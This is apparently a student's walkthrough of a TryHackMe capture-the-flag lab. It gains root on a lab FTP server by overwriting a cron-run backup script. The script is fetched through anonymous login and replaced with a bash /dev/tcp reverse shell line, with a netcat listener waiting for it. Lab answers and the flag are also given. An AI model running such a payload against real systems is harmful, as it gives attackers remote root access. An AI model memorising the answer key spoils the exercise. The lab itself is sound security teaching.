DAY 9 - ANYONE CAN BE SANTA! [NETWORKING]
----

# STORY :
----

>>Even Santa has been having to adopt the "work from home" ethic in 2020. To help Santa out, Elf McSkidy and their team created a file server for The Best Festival Company (TBFC) that uses the FTP protocol. However, an attacker was able to hack this new server. Your mission, should you choose to accept it, is to understand how this hack occurred and to retrace the steps of the attacker.

----

# Today's Learning Objectives:
----

>>Understand the fundamentals of an FTP file server and some common misconfigurations to ultimately exploit these ourselves to gain entry to tbfc-ftp-01.

----

# What is FTP & Where is it Used?
----

>>The File Transfer Protocol (FTP) offers a no-thrills means of file sharing in comparison to alternative protocols available. 
>>Whilst this protocol is unencrypted, it can be accessed through a variety of means; from dedicated software like FileZilla, the command line, or web browsers, FTP Servers have been long used to share files between devices across the Internet due to its compatibility.

>>FTP uses two connections when transferring data, as illustrated below:

>>The standard for these two connections are the two ports:
   * Port 20 (Data)
   * Port 21 (Commands)

>>Commands involve actions such as listing or navigating directories, writing to files. 
>>Whereas, the data port is where actual data such as the downloading/uploading of files are transferred over.

----

#  No Credentials? No Problem! 
----

>>Before any data can be shared, the client must log in to the FTP Server. 
>>This is to determine the commands that the client has the permission to execute, and the data that can be shared. 
>>Some websites use FTP to share files instead of the web server itself. 
>>Of course, this means that you'd have to share a username/password through some other way - that's not practical.

>>Enter FTP's "Anonymous" mode...This setting allows a default username to be used with any password by a client. This user is treated like any other user on the FTP server - including enforcing permissions and privileges to commands and data.

----

#  Using FTP Over Terminal
----

>>We're going to be using the "FTP" package that comes installed on most Linux environments but especially the THM AttackBox.To connect, we simply use ftp and provide the IP address of the Instance. In my case, I would use ftp 10.10.185.239, but you would need to use ftp MACHINE_IP for your vulnerable Instance.
>>When prompted for our "Name", we enter "anonymous". If successful, we have confirmed that the FTP Server has "anonymous" mode enabled - successful login looking like so:
>>You can use the help command to list some of the commands you can run whilst connected to the FTP Server. Here's a quick rundown of the fundamentals:

Command 	Description
ls 			List files and directories in the working directory on the FTP server
cd 			Change our working directory on the FTP server
get 		Download a file from the FTP server to our device
put 		Upload a file from our device to the FTP server

>>Let's look at the directories available to us using ls. There is only one folder with data that our user has permission to access:
>>We'll navigate to this using cd to change our working directory and then  ls to list the contents.
>>The file within this folder contains a file with a ".sh" extension. 
>>This extension is a shell script, that when executed, will run commands that we program. 
>>Let's use get to get the file from the server onto our device, so we understand why this file has been left here!

----

# Finding our Exploit
----

>>With the file downloaded, let's open it on our device using a terminal text editor such as nano.

>>We don't need to understand what happens here outside of the comments. 
>>The script executes every minute (according to Elf McEager), creates a backup of a folder and stores it in Elf McEager's home directory. 
>>What if we were to replace the commands executed in this script with our own, malicious commands? Uploading a file requires separate permission that shouldn't be granted to the "anonymous" user.
>>However, permissions are very easy to oversight - such as in the case here.

>>Let's use pentesters cheatsheet to get a good command that will be executed by the server to
generate a shell to our AttackBox, replacing the IP_ADDRESS with your TryHackMe IP, this address is displayed on the navigation bar on the Access page.

```bash
bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1 
```
>>Let's set up a netcat listener to catch the connection on our AttackBox: nc -lvnp 4444

>>We'll now attempt to upload our malicious script to the folder that we have write permissions on the FTP server by returning to our FTP prompt and using put to put the file into that directory (ensuring it is your current directory).

>>Return to our netcat listener, after waiting one minute, you should see an output like below! Success! We have a reverse system shell on the FTP Server as the most powerful user. Any commands you now use will execute on the FTP server's system.

>>Proceed to use commands similar to what we have used before to find the contents of root.txt located in the root directory! Let's break down exactly what happened here and explain the reasons as why this exploit happened:

>>The FTP Server has anonymous mode enabled allowing us to authenticate. This isn't inherently
insecure and has many legitimate uses.

>>We've discovered that we have permission to upload and download files. Whilst is also normal behaviour for FTP servers, anonymous users should not be able to upload files.

>>We've interpreted the information from a legitimate backup script to create a reverse shell onto our host.

>>The script executes as the "root" user - the most powerful on a Linux system. This is also a vulnerability, as now we have full access to the system. 
>>The use of this user should be restricted wherever possible. 
>>If the script were to execute as "elfmceager", we'd only have access to the system as that user (a much less powerful one in comparison)

----

# Conclusion, where to go from here and additional Material:
----

>>We've covered the fundamentals of FTP servers and why they're still used today. Not only this, but
we've also learned how simple misconfigurations can lead to a full-blown hack on an FTP Server.

----

# MY DOCUMENTATION :
----

>>LOGGING IN TO THE FTP SERVER WITH THE GIVEN-IP .

```bash
root@ip-10-10-34-225:~# ftp 10.10.99.28
Connected to 10.10.99.28.
220 Welcome to the TBFC FTP Server!.
Name (10.10.99.28:root): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 16  2020 backups
drwxr-xr-x    2 0        0            4096 Nov 16  2020 elf_workshops
drwxr-xr-x    2 0        0            4096 Nov 16  2020 human_resources
drwxrwxrwx    2 65534    65534        4096 Nov 16  2020 public
226 Directory send OK.
```

>>FOUND THE DIRECTORY THAT HAS BACKUP SHELL SCRIPT.  

```bash
ftp> cd public
250 Directory successfully changed.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 111      113           341 Nov 16  2020 backup.sh
-rw-rw-rw-    1 111      113            24 Nov 16  2020 shoppinglist.txt
226 Directory send OK.
```

>>TO DOWNLOAD THIS FILE TO THE LOCAL MACHINE.SET THE TRANSFER MODE TO "BINARY" AND USE "get" FILE NAME.TO GET THOSE FILE TO THE LOCAL MACHINE. 

```bash
ftp> binary
200 Switching to Binary mode.

ftp> get backup.sh
local: backup.sh remote: backup.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.sh (341 bytes).
226 Transfer complete.
341 bytes received in 0.00 secs (228.5572 kB/s)

ftp> get shoppinglist.txt
local: shoppinglist.txt remote: shoppinglist.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for shoppinglist.txt (24 bytes).
226 Transfer complete.
24 bytes received in 0.00 secs (509.5109 kB/s)


root@ip-10-10-34-225:~# cat shoppinglist.txt 
The Polar Express Movie

root@ip-10-10-34-225:~# cat backup.sh 
#!/bin/bash

# Created by ElfMcEager to backup all of Santa's goodies!

# Create backups to include date DD/MM/YYYY
filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";

# Backup FTP folder and store in elfmceager's home directory
tar -zcvf /home/elfmceager/$filename /opt/ftp

# TO-DO: Automate transfer of backups to backup server
```

>>NOW WE NEED A REVERSE SHELL.SO WE NEED TO MODIFY THE SCRIPT.HERE WE COMMENTED ALL THE CODE AND SETTING A PAYLOAD TO GET A REVERSE SHELL.

```bash
root@ip-10-10-34-225:~# nano backup.sh 
GNU nano 2.9.3                      backup.sh                       Modified  

#!/bin/bash

bash -i >& /dev/tcp/10.10.34.255/7777 0>&1
# Created by ElfMcEager to backup all of Santa's goodies!


# Create backups to include date DD/MM/YYYY
#filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";

# Backup FTP folder and store in elfmceager's home directory
#tar -zcvf /home/elfmceager/$filename /opt/ftp

# TO-DO: Automate transfer of backups to backup server
```

>>BEFORE UPLOADING THE PAYLOAD CREATE A NETCAT LISTENING SESSION.WE NEED TO REUPLOAD THAT PAYLOAD SCRIPT WE CREATED TO THE FTP SERVER.USE "put" FILE NAME TO UPLOAD IT.

```bash
ftp> put backup.sh
local: backup.sh remote: backup.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
388 bytes sent in 0.00 secs (10.0007 MB/s)
```

>>AFTER SOMETIME THERE WILL BE A REVERSE SHELL IN YOUR TERMINAL WERE WE CREATED OUR NETCAT SESSION.

```bash
root@ip-10-10-100-228:~# nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.52.218 38862 received!
bash: cannot set terminal process group (1271): Inappropriate ioctl for device
bash: no job control in this shell
root@tbfc-ftp-01:~# ls
ls
flag.txt
root@tbfc-ftp-01:~# cat flag.txt
cat flag.txt
THM{even_you_can_be_santa}

```

----

# ANSWER THE FOLLOWING :
----

1.Name the directory on the FTP server that has data accessible by the "anonymous" user
>>public

2.What script gets executed within this directory?
>>backup.sh

3.What movie did Santa have on his Christmas shopping list?
>>The Polar Express

4.Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.
>>THM{even_you_can_be_santa}

----